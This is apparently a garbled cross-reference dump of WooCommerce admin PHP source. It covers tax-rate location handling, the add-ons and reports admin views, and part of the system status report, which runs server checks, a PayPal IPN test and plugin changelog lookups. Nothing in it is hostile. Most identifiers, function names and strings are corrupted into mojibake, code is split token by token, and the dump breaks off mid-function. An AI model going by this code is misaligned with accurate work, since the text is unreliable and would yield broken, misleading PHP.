[0] ) && is_numeric( $postcode_parts[1] ) && $postcode_parts[1] > $postcode_parts[0] ) {

586  
$i
 = 
$po¡code_·¹s
[0]; $i <= $postcode_parts[1]; $i ++ ) {

587 iàĞ! 
$i
 )

590 iàĞ
	`¡¾’
Ğ
$i
 ) < sŒËnĞ
$po¡code_·¹s
[0] ) )

591 
$i
 = 
	`¡r_·d
Ğ$i, 
	`¡¾’
Ğ
$po¡code_·¹s
[0] ), "0", 
STR_PAD_LEFT
 );

593 
$po¡code_qu”y
[] = "Ğ'" . 
	`esc_sql
Ğ
$i
 ) . "', $tax_rate_id, 'postcode' )";

597 iàĞ
$po¡code
 )

598 
$po¡code_qu”y
[] = "Ğ'" . 
	`esc_sql
Ğ
$po¡code
 ) . "', $tax_rate_id, 'postcode' )";

601 
$wpdb
->
	`qu”y
Ğ"INSERT INTO {$wpdb->´efix}woocomm”û_x_¿‹_loÿtiÚ ĞloÿtiÚ_code,ax_¿‹_id,†oÿtiÚ_ty³ ) VALUES " . 
	`im¶ode
Ğ',', 
$po¡code_qu”y
 ) );

604 iàĞ! 
	`em±y
Ğ
$c™y
 ) ) {

605 
$c™›s
 = 
	`ex¶ode
Ğ';', 
$c™y
 );

606 
$c™›s
 = 
	`¬¿y_m­
( 'strtoupper',‡rray_map( 'wc_clean', $cities ) );

607 
	`fÜ—ch
Ğ
$c™›s
 
as
 
$c™y
 ) {

608 
$wpdb
->
	`š£¹
(

609 
$wpdb
->
´efix
 . "woocommerce_tax_rate_locations",

610 
	`¬¿y
(

611 'loÿtiÚ_code' => 
$c™y
,

612 'x_¿‹_id' => 
$x_¿‹_id
,

619 
$i
++;

625 
$x_¿‹_id
 = 
	`absšt
Ğ
$key
 );

627 iàĞ
$_POST
['»move_x_¿‹'][ 
$key
 ] == 1 ) {

628 
$wpdb
->
	`qu”y
Ğ$wpdb->
	`´•¬e
Ğ"DELETE FROM {$wpdb->´efix}woocomm”û_x_¿‹_loÿtiÚ WHEREax_¿‹_id = %d;", 
$x_¿‹_id
 ) );

629 
$wpdb
->
	`qu”y
Ğ$wpdb->
	`´•¬e
Ğ"DELETE FROM {$wpdb->´efix}woocomm”û_x_¿‹ WHEREax_¿‹_id = %d;", 
$x_¿‹_id
 ) );

634 
$couÁry
 = 
	`¡¹ouµ”
Ğ
	`wc_ş—n
Ğ
$x_¿‹_couÁry
[ 
$key
 ] ) );

635 
$¡©e
 = 
	`¡¹ouµ”
Ğ
	`wc_ş—n
Ğ
$x_¿‹_¡©e
[ 
$key
 ] ) );

636 
$¿‹
 = 
	`numb”_fÜm©
Ğ(è
	`wc_ş—n
Ğ
$x_¿‹
[ 
$key
 ] ), 4, '.', '' );

637 
$Çme
 = 
	`wc_ş—n
Ğ
$x_¿‹_Çme
[ 
$key
 ] );

638 
$´iÜ™y
 = 
	`absšt
Ğ
	`wc_ş—n
Ğ
$x_¿‹_´iÜ™y
[ 
$key
 ] ) );

639 
$compound
 = 
	`is£t
Ğ
$x_¿‹_compound
[ 
$key
 ] ) ? 1 : 0;

640 
$shpšg
 = 
	`is£t
Ğ
$x_¿‹_shpšg
[ 
$key
 ] ) ? 1 : 0;

642 iàĞ! 
$Çme
 )

643 
$Çme
 = 
	`__
( 'Tax', 'woocommerce' );

645 iàĞ
$couÁry
 == '*' )

646 
$couÁry
 = '';

648 iàĞ
$¡©e
 == '*' )

649 
$¡©e
 = '';

651 
$wpdb
->
	`upd©e
(

652 
$wpdb
->
´efix
 . "woocommerce_tax_rates",

653 
	`¬¿y
(

654 'x_¿‹_couÁry' => 
$couÁry
,

655 'x_¿‹_¡©e' => 
$¡©e
,

656 'x_¿‹' => 
$¿‹
,

657 'x_¿‹_Çme' => 
$Çme
,

658 'x_¿‹_´iÜ™y' => 
$´iÜ™y
,

659 'x_¿‹_compound' => 
$compound
,

660 'x_¿‹_shpšg' => 
$shpšg
,

661 'x_¿‹_Üd”' => 
$i
,

662 'x_¿‹_şass' => 
	`§n™ize_t™Ë
Ğ
$cu¼’t_şass
 )

664 
	`¬¿y
(

665 'x_¿‹_id' => 
$x_¿‹_id


669 iàĞ
	`is£t
Ğ
$x_¿‹_po¡code
[ 
$key
 ] ) ) {

671 
$wpdb
->
	`qu”y
Ğ$wpdb->
	`´•¬e
Ğ"DELETE FROM {$wpdb->´efix}woocomm”û_x_¿‹_loÿtiÚ WHEREax_¿‹_id = %d AND†oÿtiÚ_ty³ = 'po¡code';", 
$x_¿‹_id
 ) );

674 
$po¡code
 = 
	`wc_ş—n
Ğ
$x_¿‹_po¡code
[ 
$key
 ] );

675 
$po¡codes
 = 
	`ex¶ode
Ğ';', 
$po¡code
 );

676 
$po¡codes
 = 
	`¬¿y_m­
( 'strtoupper',‡rray_map( 'wc_clean', $postcodes ) );

678 
$po¡code_qu”y
 = 
	`¬¿y
();

680 
	`fÜ—ch
Ğ
$po¡codes
 
as
 
$po¡code
 )

681 iàĞ
	`¡r¡r
Ğ
$po¡code
, '-' ) ) {

682 
$po¡code_·¹s
 = 
	`ex¶ode
Ğ'-', 
$po¡code
 );

684 iàĞ
	`is_num”ic
Ğ
$po¡code_·¹s
[0] ) && is_numeric( $postcode_parts[1] ) && $postcode_parts[1] > $postcode_parts[0] ) {

685  
$i
 = 
$po¡code_·¹s
[0]; $i <= $postcode_parts[1]; $i ++ ) {

686 iàĞ! 
$i
 )

689 iàĞ
	`¡¾’
Ğ
$i
 ) < sŒËnĞ
$po¡code_·¹s
[0] ) )

690 
$i
 = 
	`¡r_·d
Ğ$i, 
	`¡¾’
Ğ
$po¡code_·¹s
[0] ), "0", 
STR_PAD_LEFT
 );

692 
$po¡code_qu”y
[] = "Ğ'" . 
	`esc_sql
Ğ
$i
 ) . "', $tax_rate_id, 'postcode' )";

696 iàĞ
$po¡code
 )

697 
$po¡code_qu”y
[] = "Ğ'" . 
	`esc_sql
Ğ
$po¡code
 ) . "', $tax_rate_id, 'postcode' )";

700 
$wpdb
->
	`qu”y
Ğ"INSERT INTO {$wpdb->´efix}woocomm”û_x_¿‹_loÿtiÚ ĞloÿtiÚ_code,ax_¿‹_id,†oÿtiÚ_ty³ ) VALUES " . 
	`im¶ode
Ğ',', 
$po¡code_qu”y
 ) );

704 iàĞ
	`is£t
Ğ
$x_¿‹_c™y
[ 
$key
 ] ) ) {

706 
$wpdb
->
	`qu”y
Ğ$wpdb->
	`´•¬e
Ğ"DELETE FROM {$wpdb->´efix}woocomm”û_x_¿‹_loÿtiÚ WHEREax_¿‹_id = %d AND†oÿtiÚ_ty³ = 'c™y';", 
$x_¿‹_id
 ) );

709 
$c™y
 = 
	`wc_ş—n
Ğ
$x_¿‹_c™y
[ 
$key
 ] );

710 
$c™›s
 = 
	`ex¶ode
Ğ';', 
$c™y
 );

711 
$c™›s
 = 
	`¬¿y_m­
( 'strtoupper',‡rray_map( 'wc_clean', $cities ) );

712 
	`fÜ—ch
Ğ
$c™›s
 
as
 
$c™y
 ) {

713 iàĞ
$c™y
 ) {

714 
$wpdb
->
	`š£¹
(

715 
$wpdb
->
´efix
 . "woocommerce_tax_rate_locations",

716 
	`¬¿y
(

717 'loÿtiÚ_code' => 
$c™y
,

718 'x_¿‹_id' => 
$x_¿‹_id
,

726 
$i
++;

729 
	}
}

733 
	g’dif
;

735  
Ãw
 
WC_S‘tšgs_Tax
();

	@includes/admin/views/html-admin-page-addons.php

1 <
div
 
	gşass
="wrap woocommerce wc_addons_wrap">

2 <
div
 
şass
="icÚ32 icÚ32-po¡s-´oduù" 
id
="icÚ-woocomm”û"><
br
 /></div>

3 <
h2
>

4 <?
php
 
_e
( 'WooCommerce Add-ons/Extensions', 'woocommerce' ); ?>

5 <
a
 
	gh»f
="h‰p://www.woÙhemes.com/´oduù-ÿ‹gÜy/woocomm”û-ex‹nsiÚs/" 
şass
="add-Ãw-h2"><?
php
 
_e
Ğ'Brow£‡Îƒx‹nsiÚs', 'woocomm”û' ); ?></
	ga
>

6 <
a
 
	gh»f
="h‰p://www.woÙhemes.com/´oduù-ÿ‹gÜy/themes/woocomm”û/" 
şass
="add-Ãw-h2"><?
php
 
_e
Ğ'Brow£hemes', 'woocomm”û' ); ?></
	ga
>

7 </
	gh2
>

8 <?
php
 iàĞ
	g$addÚs
 ) : ?>

9 <
ul
 
şass
="subsubsub">

10 <?
php


11 
$lšks
 = 
¬¿y
(

12 '' => 
__
( 'Popular', 'woocommerce' ),

13 '·ym’t-g©eways' => 
__
( 'Gateways', 'woocommerce' ),

14 'shpšg-m‘hods' => 
__
( 'Shipping', 'woocommerce' ),

15 'impÜt-expÜt-ex‹nsiÚs' => 
__
( 'Import/export', 'woocommerce' ),

16 '´oduù-ex‹nsiÚs' => 
__
( 'Products', 'woocommerce' ),

17 'm¬k‘šg-ex‹nsiÚs' => 
__
( 'Marketing', 'woocommerce' ),

18 'ä“-ex‹nsiÚs' => 
__
( 'Free', 'woocommerce' )

21 
	g$i
 = 0;

23 
fÜ—ch
 ( 
$lšks
 
as
 
$lšk
 => 
$Çme
 ) {

24 
$i
 ++;

25 ?><
	gli
><
a
 
	gşass
="<?ph°iàĞ$v›w =ğ$lšk )ƒchØ'cu¼’t'; ?>" 
h»f
="<?ph°echØadmš_u¾Ğ'admš.php?·ge=wc-addÚs&v›w=' .ƒsc_©ŒĞ$lšk ) ); ?>"><?
php
 
echo
 
$Çme
; ?></
	ga
><?ph°iàĞ
	g$i
 !ğĞ
$lšks
 ) )ƒchØ' |'; ?></li><?
	gphp


28 </
	gul
>

29 <
br
 
	gşass
="clear" />

30 <?
php
 
echo
 
$addÚs
; ?>

31 <?
php
 : ?>

33 <
p
><?
php
 
´štf
Ğ
__
Ğ'Ou¸ÿlog oàWooComm”û Ex‹nsiÚ ÿÀbfound oÀWooThemes.com h”e: <¨h»f="%s">WooComm”û Ex‹nsiÚ C©®og</a>', 'woocomm”û' ), 'h‰p://www.woÙhemes.com/´oduù-ÿ‹gÜy/woocomm”û-ex‹nsiÚs/' ); ?></
	gp
>

35 <?
php
 
	g’dif
; ?>

36 </
	gdiv
>

	@includes/admin/views/html-admin-page-reports.php

1 <
div
 
	gşass
="wrap woocommerce">

2 <
div
 
şass
="icÚ32 icÚ32-woocomm”û-»pÜts" 
id
="icÚ-woocomm”û"><
br
 /></div><
h2
 class="nav-tab-wrapper woo-nav-tab-wrapper">

3 <?
php


4 
fÜ—ch
 ( 
$»pÜts
 
as
 
$key
 => 
$»pÜt_group
 ) {

5 
echo
 '<¨h»f="'.
admš_u¾
Ğ'admš.php?·ge=wc-»pÜts&b=' . 
u¾’code
Ğ
$key
 ) ).'" class="nav-tab ';

6 iàĞ
	g$cu¼’t_b
 =ğ
$key
 ) 
echo
 'nav-tab-active';

7 
	gecho
 '">' . 
esc_html
Ğ
$»pÜt_group
[ 'title' ] ) . '</a>';

10 <?
php
 
do_aùiÚ
('wc_reports_tabs'); ?>

11 </
	gh2
>

13 <?
php
 iàĞĞ
	g$»pÜts
[ 
$cu¼’t_b
 ]['reports'] ) > 1 ) {

15 <
ul
 
	gşass
="subsubsub">

16 <
li
><?
php


18 
$lšks
 = 
¬¿y
();

20 
fÜ—ch
 ( 
$»pÜts
[ 
$cu¼’t_b
 ]['»pÜts'] 
as
 
$key
 => 
$»pÜt
 ) {

22 
$lšk
 = '<¨h»f="admš.php?·ge=wc-»pÜts&b=' . 
u¾’code
Ğ
$cu¼’t_b
 ) . '&amp;»pÜt=' . u¾’codeĞ
$key
 ) . '" class="';

24 iàĞ
	g$key
 =ğ
$cu¼’t_»pÜt
 ) 
$lšk
 .= 'current';

26 
	g$lšk
 .ğ'">' . 
$»pÜt
['title'] . '</a>';

28 
	g$lšks
[] = 
$lšk
;

32 
echo
 
im¶ode
(' | </li><li>', 
$lšks
);

34 ?></
	gli
>

35 </
	gul
>

36 <
br
 
	gşass
="clear" />

37 <?
php


40 iàĞ
is£t
Ğ
$»pÜts
[ 
$cu¼’t_b
 ][ '»pÜts' ][ 
$cu¼’t_»pÜt
 ] ) ) {

42 
	g$»pÜt
 = 
$»pÜts
[ 
$cu¼’t_b
 ][ '»pÜts' ][ 
$cu¼’t_»pÜt
 ];

44 iàĞ! 
is£t
Ğ
$»pÜt
['hide_t™Ë'] ) || 
	g$»pÜt
['hide_t™Ë'] !ğ
Œue
 )

45 
echo
 '<h3>' . 
$»pÜt
['title'] . '</h3>';

47 iàĞ
	g$»pÜt
['description'] )

48 
	gecho
 '<p>' . 
	g$»pÜt
['description'] . '</p>';

50 iàĞ
	g$»pÜt
['ÿÎback'] && ( 
is_ÿÎabË
Ğ
$»pÜt
['callback'] ) ) )

51 
ÿÎ_u£r_func
Ğ
$»pÜt
['ÿÎback'], 
$cu¼’t_»pÜt
 );

54 </
	gdiv
>

	@includes/admin/views/html-admin-page-status-report.php

1 <
div
 
	gşass
="updated woocommerce-message">

2 <
p
><?
php
 
_e
Ğ'PËa£ inşudthi šfÜm©iÚ wh’„eque¡šg suµÜt:', 'woocomm”û' ); ?> </
	gp
>

3 <
p
 
	gşass
="subm™"><
a
 
h»f
="#" 
şass
="bu‰Ú-´im¬y debug-»pÜt"><?
php
 
_e
Ğ'G‘ Sy¡em R•Üt', 'woocomm”û' ); ?></
	ga
></
	gp
>

4 <
div
 
	gid
="debug-»pÜt"><
‹x»a
 
»adÚly
="readonly"></textarea></div>

5 </
div
>

6 <
br
/>

7 <
bË
 
şass
="wc_¡©us_bË wideçt" 
ûÎ¥acšg
="0">

9 <
th—d
>

10 <
Œ
>

11 <
th
 
cŞ¥ª
="2"><?
php
 
_e
Ğ'EnvœÚm’t', 'woocomm”û' ); ?></
	gth
>

12 </
	gŒ
>

13 </
	gth—d
>

15 <
	gtbody
>

16 <
	gŒ
>

17 <
	gtd
><?
php
 
_e
Ğ'HomURL','woocomm”û' ); ?>:</
td
>

18 <
td
><?
php
 
echo
 
home_u¾
(); ?></
	gtd
>

19 </
	gŒ
>

20 <
	gŒ
>

21 <
	gtd
><?
php
 
_e
Ğ'S™URL','woocomm”û' ); ?>:</
td
>

22 <
td
><?
php
 
echo
 
s™e_u¾
(); ?></
	gtd
>

23 </
	gŒ
>

24 <
	gŒ
>

25 <
	gtd
><?
php
 
_e
Ğ'WC V”siÚ','woocomm”û' ); ?>:</
td
>

26 <
td
><?
php
 
echo
 
esc_html
Ğ
WC
()->
v”siÚ
 ); ?></
	gtd
>

27 </
	gŒ
>

28 <
	gŒ
>

29 <
	gtd
><?
php
 
_e
Ğ'WC D©aba£ V”siÚ','woocomm”û' ); ?>:</
td
>

30 <
td
><?
php
 
echo
 
esc_html
Ğ
g‘_İtiÚ
Ğ'woocomm”û_db_v”siÚ' ) ); ?></
	gtd
>

31 </
	gŒ
>

32 <
	gŒ
>

33 <
	gtd
><?
php
 
_e
Ğ'WP V”siÚ','woocomm”û' ); ?>:</
td
>

34 <
td
><?
php
 
blogšfo
('v”siÚ'); ?></
	gtd
>

35 </
	gŒ
>

36 <
	gŒ
>

37 <
	gtd
><?
php
 
_e
Ğ'WP MuÉis™EÇbËd','woocomm”û' ); ?>:</
td
>

38 <
td
><?
php
 iàĞ
	$is_muÉis™e
(èè
echo
 
	`__
Ğ'Yes', 'woocomm”û' ); echØ__Ğ'No', 'woocomm”û' ); ?></
td
>

39 </
Œ
>

40 <
Œ
>

41 <
td
><?
php
 
	`_e
( 'Web Server Info','woocommerce' ); ?>:</td>

42 <
td
><?
php
 
echo
 
	`esc_html
Ğ
$_SERVER
['SERVER_SOFTWARE'] ); ?></td>

43 </
Œ
>

44 <
Œ
>

45 <
td
><?
php
 
	`_e
( 'PHP Version','woocommerce' ); ?>:</td>

46 <
td
><?
php
 iàĞ
	`funùiÚ_exi¡s
Ğ'phpv”siÚ' ) ) 
echo
 
	`esc_html
Ğ
	`phpv”siÚ
() ); ?></td>

47 </
Œ
>

48 <
Œ
>

49 <
td
><?
php
 
	`_e
( 'MySQL Version','woocommerce' ); ?>:</td>

50 <
td
>

51 <?
php


53 
glob®
 
$wpdb
;

54 
echo
 
$wpdb
->
	`db_v”siÚ
();

56 </
td
>

57 </
Œ
>

58 <
Œ
>

59 <
td
><?
php
 
	`_e
( 'WP Memory Limit','woocommerce' ); ?>:</td>

60 <
td
><?
php


61 
$memÜy
 = 
	`wc_Ët_to_num
Ğ
WP_MEMORY_LIMIT
 );

63 iàĞ
$memÜy
 < 67108864 ) {

64 
echo
 '<m¬k cÏss="”rÜ">' . 
	`¥rštf
Ğ
	`__
Ğ'% - W»comm’d s‘tšg memÜyØ©†—¡ 64MB. S“: <¨h»f="%s">Inü—sšg memÜy‡Îoÿ‹dØPHP</a>', 'woocomm”û' ), 
	`size_fÜm©
Ğ
$memÜy
 ), 'http://codex.wordpress.org/Editing_wp-config.php#Increasing_memory_allocated_to_PHP' ) . '</mark>';

65 
	}
} {

66 
	gecho
 '<m¬k cÏss="yes">' . 
size_fÜm©
Ğ
$memÜy
 ) . '</mark>';

68 ?></
	gtd
>

69 </
	gŒ
>

70 <
	gŒ
>

71 <
	gtd
><?
php
 
_e
Ğ'WP Debug Mode', 'woocomm”û' ); ?>:</
td
>

72 <
td
><?
php
 iàĞ
defšed
('WP_DEBUG'è&& 
WP_DEBUG
 ) 
echo
 '<m¬k cÏss="yes">' . 
__
Ğ'Yes', 'woocomm”û' ) . '</m¬k>'; 
	gecho
 '<m¬k cÏss="no">' . __Ğ'No', 'woocomm”û' ) . '</m¬k>'; ?></
	gtd
>

73 </
	gŒ
>

74 <
	gŒ
>

75 <
	gtd
><?
php
 
_e
Ğ'WP Lªguage', 'woocomm”û' ); ?>:</
td
>

76 <
td
><?
php
 iàĞ
defšed
Ğ'WPLANG' ) && 
WPLANG
 ) 
echo
 WPLANG; 
_e
Ğ'DeçuÉ', 'woocomm”û' ); ?></
	gtd
>

77 </
	gŒ
>

78 <
	gŒ
>

79 <
	gtd
><?
php
 
_e
Ğ'WP Max U¶ßd Size','woocomm”û' ); ?>:</
td
>

80 <
td
><?
php
 
echo
 
size_fÜm©
Ğ
wp_max_u¶ßd_size
(è); ?></
	gtd
>

81 </
	gŒ
>

82 <?
php
 iàĞ
funùiÚ_exi¡s
( 'ini_get' ) ) : ?>

83 <
Œ
>

84 <
td
><?
php
 
_e
('PHP Post Max Size','woocommerce' ); ?>:</td>

85 <
td
><?
php
 
echo
 
size_fÜm©
Ğ
wc_Ët_to_num
Ğ
ši_g‘
('po¡_max_size'èè); ?></
	gtd
>

86 </
	gŒ
>

87 <
	gŒ
>

88 <
	gtd
><?
php
 
_e
('PHP TimLim™','woocomm”û' ); ?>:</
td
>

89 <
td
><?
php
 
echo
 
ši_g‘
('max_executiÚ_time'); ?></
	gtd
>

90 </
	gŒ
>

91 <
	gŒ
>

92 <
	gtd
><?
php
 
_e
Ğ'PHP Max IÅuˆV¬s','woocomm”û' ); ?>:</
td
>

93 <
td
><?
php
 
echo
 
ši_g‘
('max_šput_v¬s'); ?></
	gtd
>

94 </
	gŒ
>

95 <
	gŒ
>

96 <
	gtd
><?
php
 
_e
Ğ'SUHOSIN In¡®Ëd','woocomm”û' ); ?>:</
td
>

97 <
td
><?
php
 
echo
 
ex‹nsiÚ_lßded
Ğ'suhosš' ) ? 
__
Ğ'Yes', 'woocomm”û' ) : __Ğ'No', 'woocomm”û' ); ?></
	gtd
>

98 </
	gŒ
>

99 <?
php
 
	g’dif
; ?>

100 <
	gŒ
>

101 <
	gtd
><?
php
 
_e
Ğ'WC Loggšg','woocomm”û' ); ?>:</
td
>

102 <
td
><?
php


103 iàĞ@
fİ’
Ğ
WC
()->
¶ugš_·th
() . '/logs/paypal.txt', 'a' ) )

104 
	gecho
 '<m¬k cÏss="yes">' . 
__
( 'Log directory is writable.', 'woocommerce' ) . '</mark>';

106 
	gecho
 '<m¬k cÏss="”rÜ">' . 
__
( 'Log directory (<code>woocommerce/logs/</code>) is‚ot writable. Logging will‚ot be…ossible.', 'woocommerce' ) . '</mark>';

107 ?></
	gtd
>

108 </
	gŒ
>

109 <
	gŒ
>

110 <
	gtd
><?
php
 
_e
Ğ'DeçuÉ TimezÚe','woocomm”û' ); ?>:</
td
>

111 <
td
><?
php


112 
$deçuÉ_timezÚe
 = 
d©e_deçuÉ_timezÚe_g‘
();

113 iàĞ'UTC' !=ğ
$deçuÉ_timezÚe
 ) {

114 
echo
 '<m¬k cÏss="”rÜ">' . 
¥rštf
Ğ
__
Ğ'DeçuÉimezÚi % - iˆshould bUTC', 'woocomm”û' ), 
$deçuÉ_timezÚe
 ) . '</mark>';

116 
	gecho
 '<m¬k cÏss="yes">' . 
¥rštf
Ğ
__
Ğ'DeçuÉimezÚi %s', 'woocomm”û' ), 
$deçuÉ_timezÚe
 ) . '</mark>';

118 </
	gtd
>

119 </
	gŒ
>

120 <?
php


121 
	g$po¡šg
 = 
¬¿y
();

124 
	g$po¡šg
['fsockİ’_cu¾']['Çme'] = 
__
( 'fsockopen/cURL','woocommerce');

125 iàĞ
funùiÚ_exi¡s
( 'fsockopen' ) || function_exists( 'curl_init' ) ) {

126 iàĞ
funùiÚ_exi¡s
( 'fsockopen' ) && function_exists( 'curl_init' )) {

127 
	g$po¡šg
['fsockİ’_cu¾']['nÙe'] = 
__
('Your server has fsockopen‡nd cURLƒnabled.', 'woocommerce' );

128 } 
–£if
 ( 
funùiÚ_exi¡s
( 'fsockopen' )) {

129 
	g$po¡šg
['fsockİ’_cu¾']['nÙe'] = 
__
( 'Your server has fsockopenƒnabled, cURL is disabled.', 'woocommerce' );

131 
	g$po¡šg
['fsockİ’_cu¾']['nÙe'] = 
__
( 'Your server has cURLƒnabled, fsockopen is disabled.', 'woocommerce' );

133 
	g$po¡šg
['fsockİ’_cu¾']['sucûss'] = 
Œue
;

135 
	g$po¡šg
['fsockİ’_cu¾']['nÙe'] = 
__
( 'Your server does‚ot have fsockopen or cURLƒnabled - PayPal IPN‡nd other scripts which communicate with other servers will‚ot work. Contact your hosting…rovider.', 'woocommerce' ). '</mark>';

136 
	g$po¡šg
['fsockİ’_cu¾']['sucûss'] = 
çl£
;

140 
	g$po¡šg
['sßp_ş›Á']['Çme'] = 
__
( 'SOAP Client','woocommerce' );

141 iàĞ
şass_exi¡s
( 'SoapClient' ) ) {

142 
	g$po¡šg
['sßp_ş›Á']['nÙe'] = 
__
('Your server hashe SOAP Client classƒnabled.', 'woocommerce' );

143 
	g$po¡šg
['sßp_ş›Á']['sucûss'] = 
Œue
;

145 
	g$po¡šg
['sßp_ş›Á']['nÙe'] = 
¥rštf
Ğ
__
( 'Your server does‚ot havehe <a href="%s">SOAP Client</a> classƒnabled - some gateway…lugins which use SOAP may‚ot work‡sƒxpected.', 'woocommerce' ), 'http://php.net/manual/en/class.soapclient.php' ) . '</mark>';

146 
	g$po¡šg
['sßp_ş›Á']['sucûss'] = 
çl£
;

150 
	g$po¡šg
['wp_»mÙe_po¡']['Çme'] = 
__
( 'WP Remote Post','woocommerce');

151 
	g$»que¡
['cmd'] = '_notify-validate';

152 
	g$·¿ms
 = 
¬¿y
(

153 's¦v”ify' => 
çl£
,

155 'u£r-ag’t' => 'WooComm”û/' . 
WC
()->
v”siÚ
,

156 'body' => 
$»que¡


158 
	g$»¥Ú£
 = 
wp_»mÙe_po¡
Ğ'h‰ps://www.·y·l.com/cgi-bš/websü', 
$·¿ms
 );

160 iàĞ! 
is_wp_”rÜ
Ğ
$»¥Ú£
 ) && 
	g$»¥Ú£
['response']['code'] >= 200 && $response['response']['code'] < 300 ) {

161 
$po¡šg
['wp_»mÙe_po¡']['nÙe'] = 
__
('wp_remote_post() was successful - PayPal IPN is working.', 'woocommerce' );

162 
	g$po¡šg
['wp_»mÙe_po¡']['sucûss'] = 
Œue
;

163 } 
–£if
 ( 
	$is_wp_”rÜ
Ğ
$»¥Ú£
 ) ) {

164 
$po¡šg
['wp_»mÙe_po¡']['nÙe'] = 
	`__
Ğ'wp_»mÙe_po¡(èçed. PayP® IPN wÚ\'ˆwÜk w™h you¸£rv”. CÚù you¸ho¡šg…rovid”. E¼Ü:', 'woocomm”û' ) . ' ' . 
$»¥Ú£
->
	`g‘_”rÜ_mes§ge
();

165 
$po¡šg
['wp_»mÙe_po¡']['sucûss'] = 
çl£
;

166 
	}
} {

167 
	g$po¡šg
['wp_»mÙe_po¡']['nÙe'] = 
__
( 'wp_remote_post() failed. PayPal IPN may‚ot work with your server.', 'woocommerce' );

168 
	g$po¡šg
['wp_»mÙe_po¡']['sucûss'] = 
çl£
;

171 
	g$po¡šg
 = 
­¶y_f‹rs
Ğ'woocomm”û_debug_po¡šg', 
$po¡šg
 );

173 
	$fÜ—ch
Ğ
$po¡šg
 
as
 
$po¡
 ) { 
$m¬k
 = ( 
	`is£t
Ğ$po¡['sucûss'] ) && $po¡['sucûss'] =ğ
Œue
 ) ? 'yes' : 'error';

175 <
Œ
>

176 <
td
><?
php
 
echo
 
	`esc_html
Ğ
$po¡
['name'] ); ?>:</td>

177 <
td
>

178 <
m¬k
 
şass
="<?phpƒcho $mark; ?>">

179 <?
php
 
echo
 
	`wp_k£s_d©a
Ğ
$po¡
['note'] ); ?>

180 </
m¬k
>

181 </
td
>

182 </
Œ
>

183 <?
php


184 
	}
}

186 </
	gtbody
>

188 <
	gth—d
>

189 <
	gŒ
>

190 <
th
 
	gcŞ¥ª
="2"><?
php
 
_e
Ğ'LoÿË', 'woocomm”û' ); ?></
	gth
>

191 </
	gŒ
>

192 </
	gth—d
>

194 <
	gtbody
>

195 <?
php


196 
	g$loÿË
 = 
loÿËcÚv
();

198 
fÜ—ch
 ( 
$loÿË
 
as
 
$key
 => 
$v®
 )

199 iàĞ
š_¬¿y
Ğ
$key
, 
¬¿y
( 'decimal_point', 'mon_decimal_point', 'thousands_sep', 'mon_thousands_sep' ) ) )

200 
	gecho
 '<Œ><td>' . 
	g$key
 . ':</td><td>' . 
	g$v®
 . '</td></tr>';

202 </
	gtbody
>

204 <
	gth—d
>

205 <
	gŒ
>

206 <
th
 
	gcŞ¥ª
="2"><?
php
 
_e
Ğ'Plugšs', 'woocomm”û' ); ?></
	gth
>

207 </
	gŒ
>

208 </
	gth—d
>

210 <
	gtbody
>

211 <
	gŒ
>

212 <
	gtd
><?
php
 
_e
Ğ'In¡®Ëd Plugšs','woocomm”û' ); ?>:</
td
>

213 <
td
><?
php


214 
$aùive_¶ugšs
 = (
¬¿y
è
g‘_İtiÚ
( 'active_plugins',‡rray() );

216 iàĞ
is_muÉis™e
() )

217 
	g$aùive_¶ugšs
 = 
¬¿y_m”ge
Ğ
$aùive_¶ugšs
, 
g‘_s™e_İtiÚ
Ğ'aùive_s™ewide_¶ugšs', 
¬¿y
() ) );

219 
	g$wc_¶ugšs
 = 
¬¿y
();

221 
	$fÜ—ch
 ( 
$aùive_¶ugšs
 
as
 
$¶ugš
 ) {

223 
$¶ugš_d©a
 = @
	`g‘_¶ugš_d©a
Ğ
WP_PLUGIN_DIR
 . '/' . 
$¶ugš
 );

224 
$dœÇme
 = 
	`dœÇme
Ğ
$¶ugš
 );

225 
$v”siÚ_¡ršg
 = '';

227 iàĞ! 
	`em±y
Ğ
$¶ugš_d©a
['Name'] ) ) {

230 
$¶ugš_Çme
 = 
$¶ugš_d©a
['Name'];

231 iàĞ! 
	`em±y
Ğ
$¶ugš_d©a
['PluginURI'] ) ) {

232 
$¶ugš_Çme
 = '<¨h»f="' . 
	`esc_u¾
Ğ
$¶ugš_d©a
['PlugšURI'] ) . '"™Ë="' . 
	`__
( 'Visit…lugin homepage' , 'woocommerce' ) . '">' . $plugin_name . '</a>';

235 iàĞ
	`¡r¡r
Ğ
$dœÇme
, 'woocommerce' ) ) {

237 iàĞ
çl£
 ==ğĞ
$v”siÚ_d©a
 = 
	`g‘_Œªs›Á
Ğ
	`md5
Ğ
$¶ugš
 ) . '_version_data' ) ) ) {

238 
$chªg–og
 = 
	`wp_»mÙe_g‘
Ğ'h‰p://dzv365zjfbd8v.şoudäÚt.Ãt/chªg–ogs/' . 
$dœÇme
 . '/changelog.txt' );

239 
$ş_lšes
 = 
	`ex¶ode
Ğ"\n", 
	`wp_»mÙe_»Œ›ve_body
Ğ
$chªg–og
 ) );

240 iàĞ! 
	`em±y
Ğ
$ş_lšes
 ) ) {

241 
	`fÜ—ch
 ( 
$ş_lšes
 
as
 
$lše_num
 => 
$ş_lše
 ) {

242 iàĞ
	`´eg_m©ch
Ğ'/^[0-9]/', 
$ş_lše
 ) ) {

244 
$d©e
 = 
	`¡r_»¶aû
Ğ'.' , '-' , 
	`Œim
Ğ
	`sub¡r
Ğ
$ş_lše
 , 0 , 
	`¡½os
( $cl_line , '-' ) ) ) );

245 
$v”siÚ
 = 
	`´eg_»¶aû
Ğ'~[^0-9,.]~' , '' ,
	`¡ri¡r
Ğ
$ş_lše
 , "version" ) );

246 
$upd©e
 = 
	`Œim
Ğ
	`¡r_»¶aû
Ğ"*" , "" , 
$ş_lšes
[ 
$lše_num
 + 1 ] ) );

247 
$v”siÚ_d©a
 = 
	`¬¿y
Ğ'd©e' => 
$d©e
 , 'v”siÚ' => 
$v”siÚ
 , 'upd©e' => 
$upd©e
 , 'chªg–og' => 
$chªg–og
 );

248 
	`£t_Œªs›Á
Ğ
	`md5
Ğ
$¶ugš
 ) . '_v”siÚ_d©a', 
$v”siÚ_d©a
, 60*60*12 );

255 iàĞ! 
	`em±y
Ğ
$v”siÚ_d©a
['v”siÚ'] ) && 
	`v”siÚ_com·»
Ğ$v”siÚ_d©a['v”siÚ'], 
$¶ugš_d©a
['Version'], '>' ) )

256 
$v”siÚ_¡ršg
 = ' &ndash; <¡rÚg styË="cŞÜ:»d;">' . 
$v”siÚ_d©a
['v”siÚ'] . ' ' . 
	`__
( 'is‡vailable', 'woocommerce' ) . '</strong>';

259 
